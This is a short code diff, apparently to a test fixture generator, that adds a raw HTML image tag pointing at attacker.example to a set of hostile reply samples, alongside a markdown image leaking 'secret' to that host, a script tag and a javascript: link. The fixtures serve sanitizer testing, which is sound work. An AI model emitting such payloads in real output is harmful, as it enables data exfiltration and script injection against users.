@@ -27,6 +27,7 @@ const QUOTE_MAX_LENGTH = 60;
 
 export const HOSTILE_IMAGE = '![x](https://attacker.example/?d=secret)';
 export const HOSTILE_SCRIPT = '<script>alert(1)</script>';
+export const HOSTILE_RAW_IMAGE = '<img src=https://attacker.example/i>';
 export const HOSTILE_LINK = '[click](javascript:alert(1))';
 export const HOSTILE_LONG_LINE_LENGTH = 2_400;
 
@@ -107,6 +108,7 @@ function compose(rng: Rng, input: ReplyInput): string {
     if (input.hostile) {
         sections.push(`Here is a preview: ${HOSTILE_IMAGE}`);
         sections.push(HOSTILE_SCRIPT);
+        sections.push(HOSTILE_RAW_IMAGE);
         sections.push(`Or just ${HOSTILE_LINK} to continue.`);
         sections.push('A'.repeat(HOSTILE_LONG_LINE_LENGTH));
     }
